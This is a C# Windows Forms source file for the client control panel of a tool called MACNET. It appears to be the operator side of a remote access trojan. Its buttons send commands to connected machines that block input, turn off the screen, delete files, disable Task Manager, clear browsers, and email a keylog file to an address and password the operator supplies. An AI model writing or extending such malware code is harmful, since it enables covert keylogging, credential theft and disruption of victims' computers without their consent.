using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
namespace MACNET
{
    public partial class ClientPanel : Form
    {
        Server server;
        public int clientID;
        OpenFileDialog of_diaglog;

        static String EMAIL, PASSWORD;
        // VARIABLES OF MOVING
        int move, x, y;
        public ClientPanel(Server server)
        {
            InitializeComponent();
            this.server = server;
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->MESSAGE_BOX->"+textBox1.Text);
            if (textBox1.Text.Length == 0)
                return;
            textBox1.Text = "";
        }
        private void Button4_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Length == 0)
                return;
            server.clients[clientID].send_COMMAND("SERVER->OPEN_WEBSITE->" + textBox1.Text);

            textBox1.Text = "";
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            server.form.setLastActivity("Client " + server.clients[clientID].ip + " Has Disconnected By Server");
            server.clients[clientID].send_COMMAND("SERVER->CLOSE_CLIENT");
        }
        private void Button2_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void ClientPanel_Load(object sender, EventArgs e)
        {
            of_diaglog = new OpenFileDialog();
        }

        private void Button6_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->SEND_LOG_EMAIL->"+EMAIL+"->"+PASSWORD);
        }

        private void Panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (move == 1)
            {
                this.Location = new Point(Cursor.Position.X - x, Cursor.Position.Y - y);
                this.Update();
            }
        }

        private void Button8_Click(object sender, EventArgs e)
        {
            if (textBox1.Text.Length == 0)
                return;
            server.clients[clientID].send_COMMAND("SERVER->DELETE_FILE->"+textBox1.Text);
            textBox1.Text = "";
        }

        private void Button5_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->BLOCK_INPUT->");
        }

        private void Button10_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->SCREEN_OFF");
        }

        private void Button7_Click_1(object sender, EventArgs e)
        {
            EMAIL = TEXTBOX_EMAIL.Text;
            PASSWORD = TEXTBOX_PASSWORD.Text;
        }

        private void Button9_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->SET_WALLPAPER_URL->"+textBox1.Text);
        }

        private void Button13_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->CLEAR_BROWSERS_");
        }

        private void Button15_Click(object sender, EventArgs e)
        {

        }

        private void Button15_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("It may not works in Win10", "MACNET", MessageBoxButtons.OK, MessageBoxIcon.Information);
            server.clients[clientID].send_COMMAND("SERVER->TASKMGR_DISABLE");
        }

        private void Button16_Click(object sender, EventArgs e)
        {
            MessageBox.Show("It may not works in Win10","MACNET",MessageBoxButtons.OK,MessageBoxIcon.Information);
            server.clients[clientID].send_COMMAND("SERVER->TASKMGR_ENABLE");
        }

        private void Button17_Click(object sender, EventArgs e)
        {
            server.clients[clientID].send_COMMAND("SERVER->SPEAKING_TEXT->"+textBox1.Text);
        }

        private void Button12_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Sends Keylog File To Email That U Sign","Macnet",MessageBoxButtons.OK,MessageBoxIcon.Information);
        }

     

        private void Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            move = 1;
            x = Cursor.Position.X - this.Location.X;
            y = Cursor.Position.Y - this.Location.Y;
        }
        private void Panel1_MouseUp(object sender, MouseEventArgs e)
        {
            move = 0;
        }
    }
}
